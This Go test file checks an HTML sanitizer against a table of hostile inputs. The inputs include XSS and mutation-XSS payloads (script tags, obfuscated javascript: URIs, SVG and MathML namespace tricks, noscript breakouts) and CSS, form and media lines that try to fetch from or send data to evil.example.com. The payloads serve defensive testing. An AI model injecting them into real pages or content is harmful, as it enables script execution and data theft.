package docs

import (
	"errors"
	"strings"
	"testing"
)

// TestSanitize_HostilePayloads is the adversarial table. Every row names the
// class of attack or parser disagreement it guards, because a security test
// nobody can read the intent of stops being maintained.
//
// Rows assert on substrings that must be absent rather than on exact output,
// so the table keeps its meaning if the canonical serialisation shifts.
// TestSanitize_Structure below pins exact output where exactness matters.
func TestSanitize_HostilePayloads(t *testing.T) {
	tests := []struct {
		name   string
		guards string
		in     string
		// absent are substrings that must not appear in the output.
		absent []string
		// present are substrings that must appear — used where the point
		// of the row is that legitimate content *survives* the attack
		// being stripped out from around it.
		present []string
	}{
		{
			name:   "script element",
			guards: "the base case: script tags and their contents both go",
			in:     `<script>alert(1)</script><p>ok</p>`,
			absent: []string{"script", "alert"},
			// The <p> must survive: a sanitizer that bails out on the
			// first hostile token would destroy the document.
			present: []string{"<p>ok</p>"},
		},
		{
			name:   "unclosed script swallows to EOF",
			guards: "a script with no end tag must not leak its body as text",
			in:     `<p>before</p><script>alert(1)`,
			absent: []string{"alert"},
		},
		{
			name:    "event handlers on an allowed element",
			guards:  "on* handlers: stripped because the attribute allowlist is closed, not because 'on' is special-cased",
			in:      `<p onclick="x()" onmouseover="y()" ONERROR="z()">t</p>`,
			absent:  []string{"onclick", "onmouseover", "onerror", "ONERROR"},
			present: []string{"<p>t</p>"},
		},
		{
			name:   "javascript scheme in href",
			guards: "javascript: URI in the obvious place",
			in:     `<a href="javascript:alert(1)">x</a>`,
			absent: []string{"javascript", "href"},
		},
		{
			name:   "javascript scheme obfuscated with entities and whitespace",
			guards: "entity- and whitespace-obfuscated javascript: — the tokenizer decodes before we see it, which is why this works",
			in: `<a href=" javascript:alert(1)">a</a>` +
				`<a href="jav&#x09;ascript:alert(1)">b</a>` +
				`<a href="&#106;avascript:alert(1)">c</a>` +
				`<a href="JaVaScRiPt:alert(1)">d</a>`,
			absent: []string{"javascript", "JaVaScRiPt", "alert", "href"},
		},
		{
			name:   "scheme-in-scheme",
			guards: "https:javascript:… parses as scheme https with an opaque body; httpsURL's Opaque check refuses it",
			in:     `<a href="https:javascript:alert(1)">x</a>`,
			absent: []string{"javascript", "href"},
		},
		{
			name:   "vbscript and other executing schemes",
			guards: "the scheme allowlist is closed, so unenumerated executing schemes need no special case",
			in: `<a href="vbscript:msgbox(1)">a</a>` +
				`<a href="file:///etc/passwd">b</a>` +
				`<a href="blob:https://x.com/uuid">c</a>` +
				`<a href="about:blank">d</a>`,
			absent: []string{"vbscript", "file:", "blob:", "about:", "href"},
		},
		{
			name:   "data:text/html in href",
			guards: "data: URIs carrying a document, not an image — a full scripting context if navigated to",
			in:     `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
			absent: []string{"data:", "href"},
		},
		{
			name:   "data:image/svg+xml",
			guards: "SVG is a scripting host. This row exists because bluemonday's own AllowDataURIImages helper permits image/svg+xml despite its doc comment saying otherwise — dataImageURL is ours precisely so this stays refused if the library changes",
			in:     `<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">`,
			absent: []string{"svg", "src"},
		},
		{
			name:   "https image src is an external beacon",
			guards: "'https hyperlinks preserved as links only' — an https <img src> would report every reader's IP and read time to the author",
			in:     `<img src="https://tracker.example.com/pixel.png" alt="Q3 revenue">`,
			absent: []string{"tracker.example.com", "https://"},
			// The alt survives, so the reader sees what was meant to be
			// here rather than a silent gap.
			present: []string{StrippedImageSrc, `alt="Q3 revenue"`},
		},
		{
			name:   "protocol-relative image src",
			guards: "//host/path inherits the page scheme; refused as a relative URL",
			in:     `<img src="//tracker.example.com/pixel.png" alt="z">`,
			absent: []string{"tracker.example.com", "//"},
		},
		{
			name:   "javascript in srcset",
			guards: "srcset has its own comma-and-descriptor grammar that URL policies never inspect. It is absent from the attribute allowlist for that reason",
			in:     `<img srcset="javascript:alert(1) 1x, https://evil.example.com/x.png 2x" src="data:image/png;base64,iVBORw0KGgo=">`,
			absent: []string{"srcset", "javascript", "evil.example.com"},
		},
		{
			name:    "base hijack",
			guards:  "<base href> rewrites the resolution target of every relative URL in the document",
			in:      `<base href="https://evil.example.com/"><p>t</p>`,
			absent:  []string{"base", "evil.example.com"},
			present: []string{"<p>t</p>"},
		},
		{
			name:   "css url() exfiltration",
			guards: "CSS fetches: background-image and friends are absent from the property allowlist, and no allowed property's grammar can express url()",
			in: `<p style="background-image:url(https://evil.example.com/x)">a</p>` +
				`<p style="background:red url(https://evil.example.com/y)">b</p>` +
				`<p style="list-style-image:url(https://evil.example.com/z)">c</p>` +
				`<p style="content:url(https://evil.example.com/w)">d</p>` +
				`<p style="border-image:url(https://evil.example.com/v)">e</p>` +
				`<p style="cursor:url(https://evil.example.com/u),auto">f</p>`,
			absent: []string{"url(", "evil.example.com", "style"},
		},
		{
			name:   "css legacy script vectors",
			guards: "expression(), -moz-binding and behavior: executed script from CSS in older engines and are still a review red flag",
			in: `<p style="color:expression(alert(1))">a</p>` +
				`<p style="-moz-binding:url(https://evil.example.com/x.xml)">b</p>` +
				`<p style="behavior:url(x.htc)">c</p>`,
			absent: []string{"expression", "binding", "behavior", "style"},
		},
		{
			name:    "style element with an @import",
			guards:  "<style> and its contents are dropped wholesale, so stylesheet-level fetches are unreachable",
			in:      `<style>@import url("https://evil.example.com/x.css"); p{color:red}</style><p>t</p>`,
			absent:  []string{"import", "evil.example.com", "style"},
			present: []string{"<p>t</p>"},
		},
		{
			name:    "css property survives but only in a safe grammar",
			guards:  "the allowlist is not a blanket ban — the useful declarations live",
			in:      `<td style="text-align:right;background-color:#ffdddd;padding:4px 8px">1,204</td>`,
			present: []string{"text-align: right", "background-color: #ffdddd", "padding: 4px 8px"},
		},
		{
			name:    "svg with a script child",
			guards:  "foreign content: SVG switches the parser's namespace, changing how the same bytes tokenize. The subtree is dropped rather than reasoned about",
			in:      `<svg><script>alert(1)</script><circle r="1"/></svg><p>after</p>`,
			absent:  []string{"svg", "script", "alert", "circle"},
			present: []string{"<p>after</p>"},
		},
		{
			name:    "svg foreignObject smuggling HTML",
			guards:  "foreignObject re-enters HTML parsing inside SVG — a classic sanitizer split-brain",
			in:      `<svg><foreignObject><p onclick="alert(1)">hi</p></foreignObject></svg><p>after</p>`,
			absent:  []string{"svg", "foreignObject", "onclick", "alert"},
			present: []string{"<p>after</p>"},
		},
		{
			name:    "mathml namespace confusion",
			guards:  "the mglyph / mtext / annotation-xml family is the MathML half of the namespace-confusion mXSS class",
			in:      `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mtext></math><p>after</p>`,
			absent:  []string{"math", "mglyph", "onerror", "alert", "style"},
			present: []string{"<p>after</p>"},
		},
		{
			name:    "template element",
			guards:  "<template> children live in an inert fragment a browser never renders. A sanitizer that hoists them out has invented content",
			in:      `<template><img src=x onerror="alert(1)"><p>hidden</p></template><p>after</p>`,
			absent:  []string{"template", "onerror", "alert", "hidden"},
			present: []string{"<p>after</p>"},
		},
		{
			name:   "noscript mXSS",
			guards: "noscript content parses as raw text when scripting is on and as markup when it is off — the canonical mutation-XSS primitive",
			in:     `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
			absent: []string{"onerror", "alert", "img", "noscript"},
		},
		{
			name:   "xmp and plaintext raw-text elements",
			guards: "raw-text containers a naive sanitizer re-emits as live markup",
			in:     `<xmp><img src=x onerror=alert(1)></xmp><p>mid</p><plaintext><img src=y onerror=alert(2)>`,
			absent: []string{"onerror", "alert", "<img"},
		},
		{
			name:   "textarea raw-text container",
			guards: "RCDATA content is text, not markup. The right outcome is escaping, not deletion — the bytes stay visible to the reader but cannot be an element",
			in:     `<textarea><img src=x onerror=alert(1)></textarea><p>after</p>`,
			absent: []string{"<img", "<textarea"},
			// Escaped, therefore inert. assertInert below is the real
			// guarantee: no img element and no onerror attribute exist in
			// the output tree.
			present: []string{"&lt;img", "<p>after</p>"},
		},
		{
			name:   "comment boundary confusion",
			guards: "the <!--> / --!> bogus-comment forms browsers and tokenizers disagree about. Comments are dropped unconditionally, so the whole class is unreachable",
			in:     `<!--><script>alert(1)</script--><p>after</p>`,
			absent: []string{"script", "alert"},
		},
		{
			name:    "conditional comment",
			guards:  "IE-style downlevel-revealed comments smuggling markup",
			in:      `<!--[if IE]><script>alert(1)</script><![endif]--><p>after</p>`,
			absent:  []string{"script", "alert"},
			present: []string{"<p>after</p>"},
		},
		{
			name:   "cdata section",
			guards: "CDATA is text in XML and a bogus comment in HTML; the two readings differ",
			in:     `<div><![CDATA[<img src=x onerror=alert(1)>]]></div>`,
			absent: []string{"onerror", "alert", "<img"},
		},
		{
			name:   "attribute value quote breakout",
			guards: "attribute-boundary injection: output values are escaped, so a quote in a value cannot start a new attribute",
			in:     `<img src="data:image/png;base64,iVBORw0KGgo=" alt="a&quot; onerror=&quot;alert(1)">`,
			absent: []string{`onerror="`, `" onerror`},
		},
		{
			name: "doctype injection",
			guards: "x/net/html offers no safe parse of doctype internals, so doctypes are dropped whole. " +
				"Note the tokenizer ends the doctype at the first '>', which is inside the smuggled tag — so the tail " +
				"leaks out as escaped text. Inert, and worth pinning: 'alert(1)' appearing in the output as text is the " +
				"expected result here, not a bypass",
			in:      `<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "<script>alert(1)</script>"><p>t</p>`,
			absent:  []string{"DOCTYPE", "<script", "</script"},
			present: []string{"<p>t</p>"},
		},
		{
			name:    "iframe with srcdoc",
			guards:  "an iframe is a fresh document with its own scripting context, srcdoc or not",
			in:      `<iframe srcdoc="<script>alert(1)</script>" sandbox=""></iframe><p>after</p>`,
			absent:  []string{"iframe", "srcdoc", "script", "alert"},
			present: []string{"<p>after</p>"},
		},
		{
			name:    "object embed applet",
			guards:  "the plugin family — active content by definition",
			in:      `<object data="x.swf"><param name="p" value="v"></object><embed src="y.swf"><applet code="Z"></applet><p>after</p>`,
			absent:  []string{"object", "embed", "applet", "param", "swf"},
			present: []string{"<p>after</p>"},
		},
		{
			name:   "form and controls",
			guards: "forms give a document a way to send data somewhere. formaction is a navigation vector",
			in:     `<form action="https://evil.example.com/collect"><input name="secret"><button formaction="javascript:alert(1)">go</button><p>prose</p></form>`,
			absent: []string{"<form", "action", "input", "button", "javascript", "evil.example.com"},
			// Prose wrapped in a form is still the user's prose; the tag
			// goes, the text stays.
			present: []string{"prose"},
		},
		{
			name:    "meta refresh",
			guards:  "meta http-equiv=refresh is navigation without script",
			in:      `<meta http-equiv="refresh" content="0;url=https://evil.example.com/"><p>after</p>`,
			absent:  []string{"meta", "refresh", "evil.example.com"},
			present: []string{"<p>after</p>"},
		},
		{
			name:    "link stylesheet",
			guards:  "<link rel=stylesheet> is an external fetch",
			in:      `<link rel="stylesheet" href="https://evil.example.com/x.css"><p>after</p>`,
			absent:  []string{"link", "stylesheet", "evil.example.com"},
			present: []string{"<p>after</p>"},
		},
		{
			name:   "id and name attributes",
			guards: "DOM clobbering — an attacker-chosen id shadows document properties. Not allowed while nothing can link to one",
			in:     `<p id="body" name="cookie">t</p><img src="data:image/png;base64,iVBORw0KGgo=" id="location">`,
			absent: []string{`id=`, `name=`},
		},
		{
			name:    "void element on the skip-content list",
			guards:  "bluemonday ships void <frame> on its skip-content list, and that flag clears on an end tag that never comes — so one <frame> would silently truncate the rest of the document. AllowElementsContent(\"frame\") is the fix; this row is its regression test",
			in:      `<frame src="x"><p>everything after a frame</p>`,
			present: []string{"everything after a frame"},
			absent:  []string{"frame src", "<frame"},
		},
		{
			name:    "unicode and rtl override in text",
			guards:  "bidi overrides are a display-spoofing trick, not an execution one — they stay as text, which is the correct call for a document",
			in:      "<p>total‮ drawkcab‬</p>",
			present: []string{"total"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := Sanitize(tt.in)
			if err != nil {
				t.Fatalf("Sanitize returned an error for a within-bounds body: %v", err)
			}
			lower := strings.ToLower(out)
			for _, bad := range tt.absent {
				if strings.Contains(lower, strings.ToLower(bad)) {
					t.Errorf("output retains %q\nguards: %s\nin:  %s\nout: %s", bad, tt.guards, tt.in, out)
				}
			}
			for _, want := range tt.present {
				if !strings.Contains(out, want) {
					t.Errorf("output lost %q\nguards: %s\nin:  %s\nout: %s", want, tt.guards, tt.in, out)
				}
			}
			assertInert(t, out)
		})
	}
}

// TestSanitize_Structure pins the canonical output for the constructs the
// product promises. These are exact-match on purpose: the stored form is a
// contract that the exporters (4.H-EXPMD / 4.H-EXPHTML) and the renderer
// read, so a silent change to it should break a test here.
func TestSanitize_Structure(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "headings and inline emphasis",
			in:   `<h1>Runbook</h1><h2>Steps</h2><p>Use <strong>care</strong> and <em>read</em> <code>--force</code>.</p>`,
			want: `<h1>Runbook</h1><h2>Steps</h2><p>Use <strong>care</strong> and <em>read</em> <code>--force</code>.</p>`,
		},
		{
			name: "lists",
			in:   `<ol start="3"><li>one</li><li>two</li></ol><ul><li>a</li></ul>`,
			want: `<ol start="3"><li>one</li><li>two</li></ol><ul><li>a</li></ul>`,
		},
		{
			name: "table with a header scope and spans",
			in:   `<table><caption>Q3</caption><thead><tr><th scope="col">Region</th></tr></thead><tbody><tr><td colspan="2">EMEA</td></tr></tbody></table>`,
			want: `<table><caption>Q3</caption><thead><tr><th scope="col">Region</th></tr></thead><tbody><tr><td colspan="2">EMEA</td></tr></tbody></table>`,
		},
		{
			name: "mermaid survives as fenced source, not as an executable form",
			in:   `<pre><code class="language-mermaid">graph TD; A-->B;</code></pre>`,
			want: `<pre><code class="language-mermaid">graph TD; A--&gt;B;</code></pre>`,
		},
		{
			name: "katex survives as source",
			in:   `<p>Given $$E = mc^2$$ we conclude.</p>`,
			want: `<p>Given $$E = mc^2$$ we conclude.</p>`,
		},
		{
			name: "https link gains referrer hygiene",
			in:   `<p>See <a href="https://docs.example.com/x">the docs</a>.</p>`,
			want: `<p>See <a href="https://docs.example.com/x" rel="nofollow noreferrer">the docs</a>.</p>`,
		},
		{
			name: "mailto link",
			in:   `<a href="mailto:ops@example.com">ops</a>`,
			want: `<a href="mailto:ops@example.com" rel="nofollow noreferrer">ops</a>`,
		},
		{
			name: "inline raster image",
			in:   `<img src="data:image/png;base64,iVBORw0KGgo=" alt="sparkline" width="120">`,
			want: `<img src="data:image/png;base64,iVBORw0KGgo=" alt="sparkline" width="120">`,
		},
		{
			name: "text metacharacters are escaped, and stay escaped",
			in:   `<p>a < b && c > d "q" 'r'</p>`,
			want: `<p>a &lt; b &amp;&amp; c &gt; d &#34;q&#34; &#39;r&#39;</p>`,
		},
		{
			name: "already-escaped text is not double-escaped",
			in:   `<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>`,
			want: `<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>`,
		},
		{
			name: "document wrapper elements are unwrapped",
			in:   `<html><head><title>t</title></head><body><p>hi</p></body></html>`,
			want: `<p>hi</p>`,
		},
		{
			name: "details disclosure",
			in:   `<details><summary>Detail</summary><p>body</p></details>`,
			want: `<details><summary>Detail</summary><p>body</p></details>`,
		},
		{
			name: "an emptied style attribute is not emitted",
			in:   `<div style="position:absolute">t</div>`,
			want: `<div>t</div>`,
		},
		{
			name: "empty input",
			in:   ``,
			want: ``,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := Sanitize(tt.in)
			if err != nil {
				t.Fatalf("Sanitize: %v", err)
			}
			if got != tt.want {
				t.Errorf("Sanitize mismatch\nin:   %s\ngot:  %s\nwant: %s", tt.in, got, tt.want)
			}
		})
	}
}

// TestSanitize_NoExternalReferences is the FR-005 headline invariant stated
// once, directly: after sanitization no attribute value in the document can
// cause the renderer to reach the network.
func TestSanitize_NoExternalReferences(t *testing.T) {
	// Each of these tries to smuggle a fetch through a different
	// attribute. The assertion is not per-row: it is that the whole
	// sanitized corpus contains no fetchable reference at all.
	attempts := []string{
		`<img src="https://evil.example.com/a.png">`,
		`<img src="http://evil.example.com/b.png">`,
		`<img srcset="https://evil.example.com/c.png 2x">`,
		`<img src="data:image/png;base64,iVBORw0KGgo=" style="background-image:url(https://evil.example.com/d)">`,
		`<video src="https://evil.example.com/e.mp4" poster="https://evil.example.com/f.png"></video>`,
		`<audio src="https://evil.example.com/g.mp3"></audio>`,
		`<source src="https://evil.example.com/h.webm">`,
		`<track src="https://evil.example.com/i.vtt">`,
		`<input type="image" src="https://evil.example.com/j.png">`,
		`<body background="https://evil.example.com/k.png">`,
		`<table background="https://evil.example.com/l.png"><tr><td background="https://evil.example.com/m.png">x</td></tr></table>`,
		`<link rel="preload" href="https://evil.example.com/n.css">`,
		`<object data="https://evil.example.com/o.swf"></object>`,
		`<embed src="https://evil.example.com/p.swf">`,
		`<iframe src="https://evil.example.com/q"></iframe>`,
		`<use href="https://evil.example.com/r.svg#i">`,
		`<image xlink:href="https://evil.example.com/s.png">`,
		`<blockquote cite="http://evil.example.com/t">q</blockquote>`,
		`<p style="border-image:url(https://evil.example.com/u)">x</p>`,
		`<a href="https://links-are-fine.example.com/v">a link, which is allowed</a>`,
	}

	joined, err := Sanitize(strings.Join(attempts, ""))
	if err != nil {
		t.Fatalf("Sanitize: %v", err)
	}
	if strings.Contains(joined, "evil.example.com") {
		t.Errorf("a fetchable external reference survived:\n%s", joined)
	}
	// The one legitimate case must still be there — otherwise this test
	// would pass against a sanitizer that deleted everything.
	if !strings.Contains(joined, "links-are-fine.example.com") {
		t.Errorf("the allowed https hyperlink was stripped:\n%s", joined)
	}
	assertNoExternalRefs(t, joined)
}

func TestCheckLimits(t *testing.T) {
	tests := []struct {
		name string
		body string
		want error
	}{
		{"empty", "", nil},
		{"ordinary", "<p>hello</p>", nil},
		{"at the size cap", strings.Repeat("a", MaxBodyBytes), nil},
		{"over the size cap", strings.Repeat("a", MaxBodyBytes+1), ErrBodyTooLarge},
		{
			name: "at the nesting cap",
			body: strings.Repeat("<div>", MaxNestingDepth) + "x" + strings.Repeat("</div>", MaxNestingDepth),
			want: nil,
		},
		{
			name: "over the nesting cap",
			body: strings.Repeat("<div>", MaxNestingDepth+1) + "x" + strings.Repeat("</div>", MaxNestingDepth+1),
			want: ErrBodyTooDeep,
		},
		{
			name: "void elements do not open a nesting level",
			body: strings.Repeat("<br>", MaxNestingDepth*4),
			want: nil,
		},
		{"invalid utf-8", "<p>\xff\xfe</p>", ErrBodyNotUTF8},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := CheckLimits(tt.body); !errors.Is(err, tt.want) {
				t.Errorf("CheckLimits = %v, want %v", err, tt.want)
			}
		})
	}
}

// TestSanitize_OutputSizeIsCapped covers the case the input check alone
// misses: escaping grows a body, so an input that fits can produce an output
// that does not. Without this, "every stored body is within MaxBodyBytes"
// would be false, and Sanitize(Sanitize(x)) would fail on the second call.
func TestSanitize_OutputSizeIsCapped(t *testing.T) {
	// Each "<" becomes "&lt;" — four bytes out for one in.
	body := strings.Repeat("< ", MaxBodyBytes/4)
	if len(body) > MaxBodyBytes {
		t.Fatalf("test setup: input must fit under the cap, got %d", len(body))
	}
	if _, err := Sanitize(body); !errors.Is(err, ErrBodyTooLarge) {
		t.Fatalf("Sanitize = %v, want ErrBodyTooLarge", err)
	}
}

func TestErrorCode(t *testing.T) {
	tests := []struct {
		err  error
		want string
	}{
		{nil, ""},
		{ErrBodyTooLarge, CodeContentTooLarge},
		{ErrBodyTooDeep, CodeContentTooDeep},
		{ErrBodyNotUTF8, CodeContentNotUTF8},
		{errors.New("something else"), CodeInternal},
		// Wrapped errors must still classify, since callers wrap.
		{errors.Join(errors.New("saving document"), ErrBodyTooLarge), CodeContentTooLarge},
	}
	for _, tt := range tests {
		if got := ErrorCode(tt.err); got != tt.want {
			t.Errorf("ErrorCode(%v) = %q, want %q", tt.err, got, tt.want)
		}
	}
}

// TestSanitize_ErrorsAreClassifiable guards the tool layer's contract: a
// sanitizer failure must always map to a wire code the model can act on,
// never to internal_error.
func TestSanitize_ErrorsAreClassifiable(t *testing.T) {
	for _, body := range []string{
		strings.Repeat("a", MaxBodyBytes+1),
		strings.Repeat("<div>", MaxNestingDepth+1),
		"\xff",
	} {
		_, err := Sanitize(body)
		if err == nil {
			t.Fatalf("expected an error for a %d-byte out-of-bounds body", len(body))
		}
		if code := ErrorCode(err); code == CodeInternal {
			t.Errorf("out-of-bounds body produced an unclassified error: %v", err)
		}
	}
}

// TestStrippedImageSrc_IsAcceptedButNotDecodable pins both halves of the
// sentinel's design: it must survive sanitization (or Sanitize would not be
// idempotent over any document containing a stripped image), and it must not
// be a decodable image (or the reader would see a 1px gap instead of the alt
// text).
func TestStrippedImageSrc_IsAcceptedButNotDecodable(t *testing.T) {
	in := `<img src="` + StrippedImageSrc + `" alt="chart">`
	out, err := Sanitize(in)
	if err != nil {
		t.Fatalf("Sanitize: %v", err)
	}
	if !strings.Contains(out, StrippedImageSrc) {
		t.Fatalf("the sentinel did not survive sanitization: %s", out)
	}
	// One 0x00 byte is valid base64 and is not a PNG.
	if !strings.HasSuffix(StrippedImageSrc, "AA==") {
		t.Errorf("sentinel payload changed; confirm it is still base64-valid and not a renderable image: %s", StrippedImageSrc)
	}
}
